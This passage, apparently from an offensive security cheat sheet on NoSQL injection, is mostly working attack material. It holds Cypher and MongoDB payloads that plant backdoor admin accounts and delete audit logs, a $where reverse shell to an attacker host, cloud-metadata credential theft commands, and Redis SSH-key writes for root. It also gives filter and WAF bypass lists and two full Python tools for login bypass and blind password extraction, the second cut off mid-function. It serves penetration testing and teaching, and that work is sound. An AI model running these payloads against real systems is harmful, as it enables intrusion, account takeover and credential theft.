  # Extract labels (table equivalents)
  ' OR 1=1 WITH 1 as a CALL db.labels() YIELD label RETURN label //

  # Extract property keys (column equivalents)
  ' OR 1=1 WITH 1 as a CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey //

  # Extract relationships
  ' OR 1=1 WITH 1 as a MATCH ()-[r]->() RETURN type(r), r //
  ```

  ```text [Cypher — Data Manipulation]
  # Create backdoor admin node
  ' OR 1=1 WITH 1 as a CREATE (u:User {username:'hacker', password:'hacked', role:'admin'}) RETURN u //

  # Modify existing node
  ' OR 1=1 WITH 1 as a MATCH (u:User {username:'admin'}) SET u.password='hacked' RETURN u //

  # Delete audit logs
  ' OR 1=1 WITH 1 as a MATCH (l:AuditLog) DELETE l //

  # APOC procedures for command execution (if APOC is installed)
  ' OR 1=1 WITH 1 as a CALL apoc.load.json('http://attacker.com/payload') YIELD value RETURN value //
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-flame" label="Firebase / DynamoDB"}

  ::code-group
  ```text [Firebase — Security Rule Bypass]
  # Firebase Realtime Database
  # If security rules are misconfigured:

  # Read all data
  GET https://project-id.firebaseio.com/.json

  # Read specific collection
  GET https://project-id.firebaseio.com/users.json
  GET https://project-id.firebaseio.com/admin/secrets.json

  # Write data (if rules allow)
  PUT https://project-id.firebaseio.com/users/attacker.json
  Content-Type: application/json
  {"role": "admin", "username": "hacker"}

  # Delete data
  DELETE https://project-id.firebaseio.com/logs.json

  # Firebase Cloud Firestore
  # List documents via REST API:
  GET https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/users
  ```

  ```text [DynamoDB — Condition Expression Injection]
  # If user input reaches DynamoDB condition expressions:

  # Scan all items — inject into FilterExpression
  # Normal: attribute_not_exists(deleted) AND #status = :status
  # Injected:
  attribute_not_exists(deleted) OR attribute_exists(username)

  # PartiQL injection (DynamoDB SQL-compatible interface)
  # Normal: SELECT * FROM Users WHERE username='INPUT'
  # Injected:
  SELECT * FROM Users WHERE username='admin' OR '1'='1'

  # ExpressionAttributeValues manipulation
  {
    ":username": {"S": "admin"},
    ":password": {"S": {"ComparisonOperator": "NE", "AttributeValueList": [{"S": ""}]}}
  }
  ```
  ::
  :::
::

---

## Privilege Escalation via NoSQL Injection

::warning
NoSQL Injection can escalate from database-level access to **full system compromise** through credential theft, server-side JavaScript execution, or leveraging database features for OS command execution.
::

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Vertical PrivEsc"}

  ::steps{level="4"}

  #### Extract admin credentials via operator injection

  ```http
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {"username": "admin", "password": {"$ne": ""}}
  ```

  #### Extract admin's password using blind regex

  ```python
  import requests
  import string

  url = "http://target.com/api/login"
  password = ""
  chars = string.ascii_letters + string.digits + string.punctuation

  while True:
      found = False
      for c in chars:
          escaped = c.replace('\\', '\\\\').replace('.', '\\.').replace('*', '\\*')
          payload = {
              "username": "admin",
              "password": {"$regex": f"^{password}{escaped}"}
          }
          resp = requests.post(url, json=payload)
          if resp.status_code == 200 and "success" in resp.text:
              password += c
              print(f"[+] Found: {password}")
              found = True
              break
      if not found:
          break

  print(f"[!!!] Admin password: {password}")
  ```

  #### Login as admin with extracted password

  ```http
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {"username": "admin", "password": "extracted_password_here"}
  ```

  #### Access admin panel, modify roles, exfiltrate data

  ```http
  GET /admin/dashboard HTTP/1.1
  Cookie: session=admin_session_token
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="RCE via $where"}

  ::steps{level="4"}

  #### Confirm $where JavaScript execution

  ```http
  POST /api/search HTTP/1.1
  Content-Type: application/json

  {"$where": "sleep(5000)"}
  # If 5-second delay → JS execution confirmed
  ```

  #### Execute OS commands via constructor chain

  ```http
  POST /api/search HTTP/1.1
  Content-Type: application/json

  {
    "$where": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"
  }
  ```

  #### Establish reverse shell

  ```http
  {
    "$where": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')"
  }
  ```

  #### Escalate to root on the server

  ```bash
  # Once you have shell access:
  whoami  # mongodb or app user
  
  # Check sudo
  sudo -l
  
  # SUID binaries
  find / -perm -4000 -type f 2>/dev/null
  
  # MongoDB config for additional creds
  cat /etc/mongod.conf
  cat /var/www/app/.env
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="Full PrivEsc Chain"}

  | Step | Technique | Access Level |
  |------|-----------|-------------|
  | 1 | Operator injection (`$ne`) | Authentication bypass |
  | 2 | Blind regex extraction | Admin password obtained |
  | 3 | Admin panel access | Application admin |
  | 4 | `$where` JS execution | Server-side code execution |
  | 5 | Reverse shell via `child_process` | OS shell as app/mongo user |
  | 6 | Read application config (.env) | Database credentials, API keys |
  | 7 | Credential reuse | Access to other services |
  | 8 | SUID/sudo/kernel exploit | Root access |
  | 9 | Pivot to internal network | Lateral movement |
  | 10 | Cloud metadata theft | Cloud account takeover |

  ::code-group
  ```bash [Step 6 — Extract Application Secrets]
  # From reverse shell, find config files
  find / -name ".env" -o -name "config.js" -o -name "database.yml" 2>/dev/null

  cat /var/www/app/.env
  # DB_HOST=10.0.1.50
  # DB_USER=prod_admin
  # DB_PASS=Pr0d_S3cret!
  # AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
  # AWS_SECRET_KEY=wJalrXUtnFEMI/...
  # STRIPE_SECRET=sk_live_...
  # JWT_SECRET=super_secret_key

  cat /var/www/app/config/database.js
  ```

  ```bash [Step 8 — Linux Privilege Escalation]
  # Check for Docker socket (common in containerized apps)
  ls -la /var/run/docker.sock
  # If accessible: docker run -v /:/host -it alpine chroot /host bash

  # MongoDB user may have sudo
  sudo -l

  # Check kernel
  uname -a
  cat /etc/os-release

  # Common MongoDB container escapes
  mount | grep docker
  cat /proc/1/cgroup
  ```

  ```bash [Step 9 — Cloud Metadata (if on cloud)]
  # AWS
  curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
  curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

  # GCP
  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

  # Azure
  curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Redis → RCE PrivEsc"}

  ::steps{level="4"}

  #### Discover exposed Redis (via SSRF or direct)

  ```bash
  # Scan for Redis
  nmap -p 6379 target.com
  redis-cli -h target.com ping
  ```

  #### Write SSH key for root access

  ```bash
  # Generate SSH key
  ssh-keygen -t rsa -f ./redis_rsa -N ""

  # Prepare payload
  (echo -e "\n\n"; cat redis_rsa.pub; echo -e "\n\n") > payload.txt

  # Write via Redis
  redis-cli -h target.com flushall
  cat payload.txt | redis-cli -h target.com -x set payload
  redis-cli -h target.com config set dir /root/.ssh/
  redis-cli -h target.com config set dbfilename "authorized_keys"
  redis-cli -h target.com save
  ```

  #### SSH into the server as root

  ```bash
  ssh -i redis_rsa root@target.com
  ```

  #### Full system compromise

  ```bash
  whoami  # root
  cat /etc/shadow
  ```

  ::
  :::
::

---

## Bypass Techniques

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Bypass: Input Type Validation"}

  When the application validates that password is a string, bypass by using alternative injection vectors.

  ::code-group
  ```text [Content-Type Switching]
  # If JSON body is validated, try URL-encoded form data:
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password[$ne]=

  # Or try multipart form:
  Content-Type: multipart/form-data; boundary=----Boundary

  ------Boundary
  Content-Disposition: form-data; name="username"

  admin
  ------Boundary
  Content-Disposition: form-data; name="password[$ne]"


  ------Boundary--
  ```

  ```text [Bracket Notation via Query String]
  # Even if body is validated, try query parameters:
  POST /login?password[$ne]= HTTP/1.1
  Content-Type: application/json

  {"username": "admin", "password": "anything"}

  # Some frameworks merge query params with body
  ```

  ```text [Array Injection]
  # Send password as array
  {"username": "admin", "password": [""]}
  {"username": "admin", "password": [{"$ne": ""}]}

  # URL params
  password[]=&username=admin
  password[0][$ne]=&username=admin
  ```

  ```text [Prototype Pollution Chain]
  # If app uses lodash.merge or similar:
  {
    "username": "admin",
    "password": "anything",
    "__proto__": {
      "password": {"$ne": ""}
    }
  }

  # Or via constructor
  {
    "username": "admin",
    "constructor": {
      "prototype": {
        "password": {"$ne": ""}
      }
    }
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-filter" label="Bypass: Operator Filtering"}

  When the application strips or blocks `$` operators.

  ::code-group
  ```text [Unicode Dollar Sign]
  # Use unicode full-width dollar sign
  {"username": "admin", "password": {"＄ne": ""}}

  # URL encoded dollar
  password[%24ne]=

  # Double encoded
  password[%2524ne]=

  # HTML entity
  password[&#36;ne]=
  ```

  ```text [Alternative Operators]
  # If $ne is blocked, try others:
  {"password": {"$gt": ""}}         # Greater than
  {"password": {"$gte": " "}}       # Greater than or equal
  {"password": {"$lt": "~"}}        # Less than tilde (matches most strings)
  {"password": {"$lte": "~"}}       # Less than or equal
  {"password": {"$nin": [""]}}      # Not in array
  {"password": {"$not": {"$eq": ""}}} # Not equal (nested)
  {"password": {"$exists": true}}   # Field exists
  {"password": {"$type": 2}}        # Field is string type
  {"password": {"$regex": "."}}     # Matches any single char
  {"password": {"$size": 8}}        # Array of size 8 (edge case)
  ```

  ```text [Dot Notation Bypass]
  # If top-level operators are filtered but nested aren't:
  {"password.value": {"$ne": ""}}
  {"credentials.password": {"$ne": ""}}
  ```

  ```text [$where as Alternative (if JS enabled)]
  # If query operators are blocked but $where isn't:
  {"$where": "this.password != ''"}
  {"$where": "this.password.length > 0"}
  {"$where": "this.username == 'admin' && this.password.length > 0"}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-regex" label="Bypass: Regex Filtering"}

  When the application filters regex characters or the `$regex` operator.

  ::code-group
  ```text [Alternative Regex Syntax]
  # Standard $regex
  {"password": {"$regex": ".*"}}

  # With $options
  {"password": {"$regex": ".*", "$options": "si"}}

  # BsonRegularExpression
  {"password": /^.*/}

  # Via $where
  {"$where": "/.*/.test(this.password)"}
  {"$where": "this.password.match(/.*/)"} 
  ```

  ```text [Character Class Alternatives]
  # Instead of .* (if dot is filtered):
  {"password": {"$regex": "[\\s\\S]*"}}
  {"password": {"$regex": "[\\w\\W]*"}}
  {"password": {"$regex": "[\\d\\D]*"}}
  {"password": {"$regex": "[^$]*"}}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-wrench" label="Bypass: Framework-Specific"}

  ::code-group
  ```text [Express.js + body-parser]
  # body-parser with extended: true allows bracket notation
  # These are equivalent:
  # JSON: {"password": {"$ne": ""}}
  # URL:  password[$ne]=
  # Both parsed to the same JavaScript object

  # If JSON parsing is strict, use URL encoding:
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password[$ne]=
  ```

  ```text [Express.js + qs library]
  # qs library parses complex query strings:
  password[$ne]=
  password[$gt]=
  password[$regex]=.*
  $or[0][username]=admin&$or[1][username]=root&password[$ne]=

  # Depth limiting bypass:
  # If qs depth limit is set, flatten:
  password[$ne]=
  # vs
  filter[password][$ne]=  # May exceed depth limit
  ```

  ```text [Django + djongo / pymongo]
  # If using raw pymongo queries:
  # Input reaches: collection.find({"username": input_user, "password": input_pass})
  
  # Python dict injection via JSON:
  {"username": "admin", "password": {"$ne": ""}}
  
  # Via query string (if using QueryDict):
  ?username=admin&password__ne=
  ```

  ```text [PHP + MongoDB driver]
  # PHP's MongoDB driver processes associative arrays
  # URL params with bracket notation:
  username=admin&password[$ne]=

  # PHP processes this as:
  # $_POST = ["username" => "admin", "password" => ["$ne" => ""]]
  # Directly used in: $collection->findOne($_POST)
  ```

  ```text [Ruby + Mongoid / mongo gem]
  # Rack parses bracket notation in params:
  password[$ne]=
  password[$gt]=

  # Hash-based injection:
  # params[:password] becomes {"$ne" => ""}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-lock" label="Bypass: WAF / Input Sanitization"}

  ::code-group
  ```text [Encoding Bypass]
  # URL encoding
  password%5B%24ne%5D=
  password%5B%24gt%5D=

  # Double URL encoding
  password%255B%2524ne%255D=

  # Unicode encoding
  password%5B%EF%BC%84ne%5D=

  # Mixed encoding
  password[%24ne]=
  ```

  ```text [Case Variation]
  # MongoDB operators are case-sensitive but some frameworks normalize:
  {"password": {"$NE": ""}}        # May not work with MongoDB but bypass WAF
  {"password": {"$Ne": ""}}
  {"password": {"$nE": ""}}
  ```

  ```text [Padding / Whitespace]
  # Add whitespace or null bytes
  {"password": {" $ne": ""}}
  {"password": {"$ne ": ""}}
  {"password": {"\t$ne": ""}}
  {"password": {"$ne\x00": ""}}
  ```

  ```text [JSON Comments (non-standard)]
  # Some parsers accept comments:
  {"password": {"$ne"/* comment */: ""}}
  {"password": /*comment*/ {"$ne": ""}}
  ```

  ```text [Duplicate Keys]
  # Some JSON parsers use last value:
  {"password": "legitimate", "password": {"$ne": ""}}
  
  # Or first value:
  {"password": {"$ne": ""}, "password": "legitimate"}
  ```
  ::
  :::
::

---

## Automated Exploitation

::code-collapse

```python [nosqli_scanner.py]
#!/usr/bin/env python3
"""
NoSQL Injection Scanner — Multi-Technique Detection & Exploitation
Tests MongoDB, CouchDB, and other NoSQL databases
For authorized penetration testing only
"""

import requests
import json
import sys
import time
import string
import re
from urllib.parse import urlparse, parse_qs
from dataclasses import dataclass, asdict
from typing import List, Optional, Dict
from concurrent.futures import ThreadPoolExecutor

@dataclass
class NoSQLiResult:
    technique: str
    parameter: str
    payload: dict
    delivery: str  # json, urlparam, formdata
    status_code: int
    response_length: int
    vulnerable: bool
    evidence: str
    severity: str
    database: str = "unknown"

class NoSQLiScanner:

    OPERATOR_PAYLOADS = [
        {"$ne": ""},
        {"$ne": "x"},
        {"$gt": ""},
        {"$gte": " "},
        {"$lt": "~"},
        {"$nin": [""]},
        {"$regex": ".*"},
        {"$regex": ".{1,}"},
        {"$exists": True},
        {"$type": 2},
        {"$not": {"$eq": ""}},
    ]

    WHERE_PAYLOADS = [
        "1==1",
        "true",
        "this.password.length>0",
        "this.username=='admin'",
    ]

    MONGO_ERRORS = [
        r"MongoError", r"MongoServerError", r"mongo", r"BSON",
        r"CastError", r"ObjectId", r"E11000", r"\$ne",
        r"\$gt", r"\$regex", r"ns not found", r"cursor",
        r"Mongoose", r"ValidationError.*mongo", r"BSONTypeError",
    ]

    def __init__(self, target_url, method='POST', param_username='username',
                 param_password='password', known_username='admin'):
        self.target = target_url
        self.method = method.upper()
        self.param_user = param_username
        self.param_pass = param_password
        self.known_user = known_username
        self.results: List[NoSQLiResult] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.baseline_fail = None
        self.baseline_success = None
        self.detected_db = 'unknown'

    def get_baseline(self):
        """Establish baseline responses for comparison"""
        print("[*] Establishing baselines...")

        # Failed login baseline
        fail_payload = {self.param_user: "invalid_user_xyz", self.param_pass: "invalid_pass_xyz"}
        try:
            resp = self.session.post(self.target, json=fail_payload, timeout=10)
            self.baseline_fail = {
                'status': resp.status_code,
                'length': len(resp.text),
                'body': resp.text[:500]
            }
            print(f"    Failed login: HTTP {resp.status_code}, {len(resp.text)} bytes")
        except Exception as e:
            print(f"    [ERROR] {e}")

    def detect_database(self, response_text):
        """Identify NoSQL database from error messages"""
        for pattern in self.MONGO_ERRORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return 'mongodb'
        if 'couchdb' in response_text.lower():
            return 'couchdb'
        if 'redis' in response_text.lower():
            return 'redis'
        if 'elasticsearch' in response_text.lower():
            return 'elasticsearch'
        return 'unknown'

    def is_successful(self, resp):
        """Determine if response indicates successful injection"""
        if self.baseline_fail is None:
            return False

        # Different status code than failure
        if resp.status_code != self.baseline_fail['status']:
            if resp.status_code in [200, 302, 301]:
                return True

        # Significantly different response length
        len_diff = abs(len(resp.text) - self.baseline_fail['length'])
        if len_diff > 50:
            return True

        # Success indicators in response
        success_words = ['success', 'welcome', 'dashboard', 'token', 'session',
                        'authenticated', 'true', 'logged', 'profile']
        fail_words = ['invalid', 'incorrect', 'wrong', 'failed', 'error',
                     'denied', 'unauthorized', 'false']

        body_lower = resp.text.lower()
        has_success = any(w in body_lower for w in success_words)
        has_fail = any(w in body_lower for w in fail_words)

        if has_success and not has_fail:
            return True

        return False

    def test_json_injection(self):
        """Test operator injection via JSON body"""
        print("\n[*] Testing JSON body operator injection...")

        for operator_payload in self.OPERATOR_PAYLOADS:
            payload = {
                self.param_user: self.known_user,
                self.param_pass: operator_payload
            }

            try:
                resp = self.session.post(self.target, json=payload, timeout=10)
                success = self.is_successful(resp)
                db = self.detect_database(resp.text)

                if db != 'unknown':
                    self.detected_db = db

                result = NoSQLiResult(
                    technique=f"Operator: {list(operator_payload.keys())[0] if isinstance(operator_payload, dict) else str(operator_payload)}",
                    parameter=self.param_pass,
                    payload=payload,
                    delivery="json",
                    status_code=resp.status_code,
                    response_length=len(resp.text),
                    vulnerable=success,
                    evidence=f"{'SUCCESS' if success else 'FAIL'} — HTTP {resp.status_code}, {len(resp.text)} bytes",
                    severity="critical" if success else "info",
                    database=db
                )
                self.results.append(result)

                icon = "🔴" if success else "🟢"
                op_str = json.dumps(operator_payload)[:50]
                print(f"    {icon} JSON {op_str}: HTTP {resp.status_code} ({len(resp.text)} bytes)")

                if success:
                    return result

                time.sleep(0.3)

            except Exception as e:
                print(f"    ⚠️  Error: {e}")

        return None

    def test_urlparam_injection(self):
        """Test operator injection via URL parameters (bracket notation)"""
        print("\n[*] Testing URL parameter bracket notation injection...")

        payloads = [
            f"{self.param_user}={self.known_user}&{self.param_pass}[$ne]=",
            f"{self.param_user}={self.known_user}&{self.param_pass}[$gt]=",
            f"{self.param_user}={self.known_user}&{self.param_pass}[$regex]=.*",
            f"{self.param_user}={self.known_user}&{self.param_pass}[$exists]=true",
            f"{self.param_user}[$ne]=&{self.param_pass}[$ne]=",
            f"{self.param_user}[$gt]=&{self.param_pass}[$gt]=",
            f"{self.param_user}={self.known_user}&{self.param_pass}[$nin][]=",
            f"$or[0][{self.param_user}]={self.known_user}&$or[1][{self.param_user}]=root&{self.param_pass}[$ne]=",
        ]

        for payload_str in payloads:
            try:
                resp = self.session.post(
                    self.target,
                    data=payload_str,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=10
                )
                success = self.is_successful(resp)

                result = NoSQLiResult(
                    technique="URL Bracket Notation",
                    parameter=self.param_pass,
                    payload={"raw": payload_str},
                    delivery="urlparam",
                    status_code=resp.status_code,
                    response_length=len(resp.text),
                    vulnerable=success,
                    evidence=f"{'SUCCESS' if success else 'FAIL'} — HTTP {resp.status_code}",
                    severity="critical" if success else "info",
                    database=self.detected_db
                )
                self.results.append(result)

                icon = "🔴" if success else "🟢"
                print(f"    {icon} URL: {payload_str[:60]}: HTTP {resp.status_code}")

                if success:
                    return result

                time.sleep(0.3)

            except Exception as e:
                print(f"    ⚠️  Error: {e}")

        return None

    def test_where_injection(self):
        """Test $where JavaScript injection"""
        print("\n[*] Testing $where JavaScript injection...")

        for where_code in self.WHERE_PAYLOADS:
            payload = {
                self.param_user: self.known_user,
                "$where": where_code
            }

            try:
                resp = self.session.post(self.target, json=payload, timeout=10)
                success = self.is_successful(resp)

                result = NoSQLiResult(
                    technique=f"$where: {where_code}",
                    parameter="$where",
                    payload=payload,
                    delivery="json",
                    status_code=resp.status_code,
                    response_length=len(resp.text),
                    vulnerable=success,
                    evidence=f"JS execution {'confirmed' if success else 'not confirmed'}",
                    severity="critical" if success else "info",
                    database="mongodb"
                )
                self.results.append(result)

                icon = "🔴" if success else "🟢"
                print(f"    {icon} $where '{where_code}': HTTP {resp.status_code}")

                time.sleep(0.3)

            except Exception as e:
                print(f"    ⚠️  Error: {e}")

        # Time-based $where test
        print("\n  [*] Testing time-based $where (5s delay)...")
        time_payload = {
            self.param_user: self.known_user,
            "$where": "sleep(5000) || true"
        }
        try:
            start = time.time()
            resp = self.session.post(self.target, json=time_payload, timeout=15)
            elapsed = time.time() - start

            if elapsed >= 4.5:
                result = NoSQLiResult(
                    technique="$where time-based",
                    parameter="$where",
                    payload=time_payload,
                    delivery="json",
                    status_code=resp.status_code,
                    response_length=len(resp.text),
                    vulnerable=True,
                    evidence=f"Sleep detected: {elapsed:.1f}s delay",
                    severity="critical",
                    database="mongodb"
                )
                self.results.append(result)
                print(f"    🔴 Time-based $where: {elapsed:.1f}s delay — JS EXECUTION CONFIRMED!")
            else:
                print(f"    🟢 No delay ({elapsed:.1f}s)")

        except requests.exceptions.Timeout:
            print(f"    🔴 Request timed out — possible JS execution!")
        except Exception as e:
            print(f"    ⚠️  Error: {e}")

    def test_both_fields(self):
        """Test injection in both username and password fields"""
        print("\n[*] Testing operator injection in both fields...")

        both_payloads = [
            {self.param_user: {"$ne": ""}, self.param_pass: {"$ne": ""}},
            {self.param_user: {"$gt": ""}, self.param_pass: {"$gt": ""}},
            {self.param_user: {"$ne": None}, self.param_pass: {"$ne": None}},
            {self.param_user: {"$exists": True}, self.param_pass: {"$exists": True}},
            {self.param_user: {"$regex": ".*"}, self.param_pass: {"$regex": ".*"}},
        ]

        for payload in both_payloads:
            try:
                resp = self.session.post(self.target, json=payload, timeout=10)
                success = self.is_successful(resp)

                if success:
                    result = NoSQLiResult(
                        technique="Both fields operator injection",
                        parameter="both",
                        payload=payload,
                        delivery="json",
                        status_code=resp.status_code,
                        response_length=len(resp.text),
                        vulnerable=True,
                        evidence=f"Both fields bypassed — returns first matching user",
                        severity="critical",
                        database=self.detected_db
                    )
                    self.results.append(result)
                    print(f"    🔴 Both fields: {json.dumps(payload)[:60]} — SUCCESS")
                    return result

                time.sleep(0.3)

            except Exception as e:
                print(f"    ⚠️  Error: {e}")

        print(f"    🟢 No bypass via both-field injection")
        return None

    def extract_password_blind(self, username='admin'):
        """Extract password via blind regex injection"""
        print(f"\n[*] Attempting blind password extraction for '{username}'...")

        password = ""
        charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*()_+-=[]{}|;:',.<>?/~`"

        # First determine password length
        print("  [*] Determining password length...")
        for length in range(1, 65):
            payload = {
                self.param_user: username,
                self.param_pass: {"$regex": f"^.{{{length}}}$"}
            }
            try:
                resp = self.session.post(self.target, json=payload, timeout=10)
                if self.is_successful(resp):
                    print(f"  [+] Password length: {length}")
                    break
            except:
                pass
        else:
            print("  [-] Could not determine password length")
            return None

        # Extract character by character
        print(f"  [*] Extracting password ({length} characters)...")
        for pos in range(length):
            found = False
            for char in charset:
                # Escape regex special characters
                escaped = re.escape(char)
                regex_pattern = f"^{re.escape(password)}{escaped}"

                payload = {
                    self.param_user: username,
                    self.param_pass: {"$regex": regex_pattern}
                }

                try:
                    resp = self.session.post(self.target, json=payload, timeout=10)
                    if self.is_successful(resp):
                        password += char
                        print(f"  [+] Position {pos+1}/{length}: {password}")
                        found = True
                        break
                except:
                    pass

                time.sleep(0.1)

            if not found:
                print(f"  [-] Could not extract character at position {pos+1}")
                break

        if password:
            print(f"\n  [!!!] Extracted password for '{username}': {password}")
        return password

    def enumerate_users(self, max_users=20):
        """Enumerate usernames via $nin exclusion"""
        print(f"\n[*] Enumerating users (max {max_users})...")

        found_users = []

        for i in range(max_users):
            payload = {
                self.param_user: {"$nin": found_users} if found_users else {"$ne": ""},
                self.param_pass: {"$ne": ""}
            }

            try:
                resp = self.session.post(self.target, json=payload, timeout=10)

                if self.is_successful(resp):
                    # Try to extract username from response
                    try:
                        data = resp.json()
                        username = None

                        # Common response patterns
                        for key in ['username', 'user', 'name', 'login', 'email']:
                            if key in data:
                                username = data[key]
                                break
                            if 'user' in data and isinstance(data['user'], dict):
                                if key in data['user']:
                                    username = data['user'][key]
                                    break
                            if 'data' in data and isinstance(data['data'], dict):
                                if key in data['data']:
                                    username = data['data'][key]
                                    break

                        if username and username not in found_users:
                            found_users.append(username)
                            print(f"    [+] User {len(found_users)}: {username}")
                        else:
                            break

                    except json.JSONDecodeError:
                        print(f"    [?] Got 200 but can't parse response — manual check needed")
                        break
                else:
                    break

                time.sleep(0.3)

            except Exception as e:
                print(f"    ⚠️  Error: {e}")
                break

        print(f"\n  [*] Found {len(found_users)} users: {found_users}")
        return found_users

    def generate_report(self):
        """Generate scan report"""
        vulnerable = [r for r in self.results if r.vulnerable]

        report = {
            "target": self.target,
            "method": self.method,
            "detected_database": self.detected_db,
            "total_tests": len(self.results),
            "vulnerabilities": len(vulnerable),
            "results": [asdict(r) for r in self.results]
        }

        filename = "nosqli_scan_report.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        print(f"\n{'='*65}")
        print(f" NoSQL INJECTION SCAN COMPLETE")
        print(f"{'='*65}")
        print(f" Target:              {self.target}")
        print(f" Database detected:   {self.detected_db}")
        print(f" Total tests:         {len(self.results)}")
        print(f" Vulnerabilities:     {len(vulnerable)}")
        print(f" Report saved:        {filename}")

        if vulnerable:
            print(f"\n 🔴 VULNERABLE FINDINGS:")
            for v in vulnerable:
                print(f"    [{v.technique}] via {v.delivery}: {v.evidence}")

        print(f"{'='*65}")
        return report

    def run_all(self):
        """Execute all NoSQL injection tests"""
        print(f"{'='*65}")
        print(f" NoSQL Injection Scanner")
        print(f" Target:   {self.target}")
        print(f" Username: {self.known_user}")
        print(f" Params:   {self.param_user}, {self.param_pass}")
        print(f"{'='*65}")

        self.get_baseline()
        self.test_json_injection()
        self.test_urlparam_injection()
        self.test_both_fields()
        self.test_where_injection()

        # If vulnerable, attempt extraction
        vulnerable = [r for r in self.results if r.vulnerable]
        if vulnerable:
            print("\n[!!!] Injection confirmed — attempting data extraction...")
            users = self.enumerate_users()
            if users:
                self.extract_password_blind(users[0])

        return self.generate_report()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <login_url> [username_param] [password_param] [known_username]")
        print(f"Example: {sys.argv[0]} http://target.com/api/login username password admin")
        sys.exit(1)

    scanner = NoSQLiScanner(
        target_url=sys.argv[1],
        param_username=sys.argv[2] if len(sys.argv) > 2 else 'username',
        param_password=sys.argv[3] if len(sys.argv) > 3 else 'password',
        known_username=sys.argv[4] if len(sys.argv) > 4 else 'admin'
    )
    scanner.run_all()
```

::

::code-collapse

```python [nosqli_blind_extractor.py]
#!/usr/bin/env python3
"""
NoSQL Blind Data Extractor
Extracts field values character-by-character via regex injection
For authorized penetration testing only
"""

import requests
import string
import re
import sys
import time
import json
from concurrent.futures import ThreadPoolExecutor

class BlindExtractor:
    
    def __init__(self, target_url, param_user='username', param_pass='password'):
        self.target = target_url
        self.param_user = param_user
        self.param_pass = param_pass
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        })
        self.charset = (
            string.ascii_lowercase + 
            string.ascii_uppercase + 
            string.digits + 
            "!@#$%^&*()_+-=[]{}|;:',.<>?/~` "
        )

    def check(self, payload):
        """Send payload and check if condition is true"""
        try:
            resp = self.session.post(self.target, json=payload, timeout=10)
            # Adjust this condition based on target's response
            return resp.status_code == 200 and 'success' in resp.text.lower()
        except:
            return False

    def extract_field_length(self, username, field='password', max_length=128):
        """Determine the length of a field value"""
        print(f"[*] Extracting {field} length for '{username}'...")
        
        # Binary search for length
        low, high = 1, max_length
        while low <= high:
            mid = (low + high) // 2
            
            # Test if length >= mid
            payload = {
                self.param_user: username,
                field: {"$regex": f"^.{{{mid},}}$"}
            }
            
            if self.check(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        length = high
        
        # Verify exact length
        payload = {
            self.param_user: username,
            field: {"$regex": f"^.{{{length}}}$"}
        }
        if self.check(payload):
            print(f"    [+] {field} length: {length}")
            return length
        
        print(f"    [-] Could not determine exact length (approx: {length})")
        return length

    def extract_field_value(self, username, field='password', length=None):
        """Extract field value character by character"""
        if length is None:
            length = self.extract_field_length(username, field)
        
        if not length:
            return None
        
        print(f"[*] Extracting {field} value ({length} chars)...")
        value = ""
        
        for pos in range(length):
            found = False
            
            # Binary search on character
            for char in self.charset:
                escaped = re.escape(char)
                regex_pattern = f"^{re.escape(value)}{escaped}"
                
                payload = {
                    self.param_user: username,
                    field: {"$regex": regex_pattern}
                }
                
                if self.check(payload):
                    value += char
                    sys.stdout.write(f"\r    [+] Progress: {value}")
                    sys.stdout.flush()
                    found = True
                    break
                
                time.sleep(0.05)  # Rate limiting
            
            if not found:
                print(f"\n    [-] Stuck at position {pos+1}")
                break
        
        print(f"\n    [!!!] {field} = {value}")
        return value

    def enumerate_users(self, max_users=50):
        """Enumerate all usernames"""
        print("[*] Enumerating usernames...")
        users = []
        
        for i in range(max_users):
            payload = {
                self.param_user: {"$nin": users} if users else {"$ne": ""},
                self.param_pass: {"$ne": ""}
            }
            
            # We need to extract username via regex
            username = ""
            for pos in range(64):
                found = False
                for char in self.charset:
                    escaped = re.escape(char)
                    regex = f"^{re.escape(username)}{escaped}"
                    
                    test_payload = {
                        self.param_user: {
                            "$regex": regex,
                            "$nin": users
                        } if users else {"$regex": regex},
                        self.param_pass: {"$ne": ""}
                    }
                    
                    if self.check(test_payload):
                        username += char
                        found = True
                        break
                    
                    time.sleep(0.05)
                
                if not found:
                    break
            
            if username:
                users.append(username)
                print(f"    [+] User {len(users)}: {username}")
            else:
                break
        
        print(f"\n[*] Found {len(users)} users: {users}")
        return users

    def extract_all(self, fields=None):
        """Extract all data from all users"""
        if fields is None:
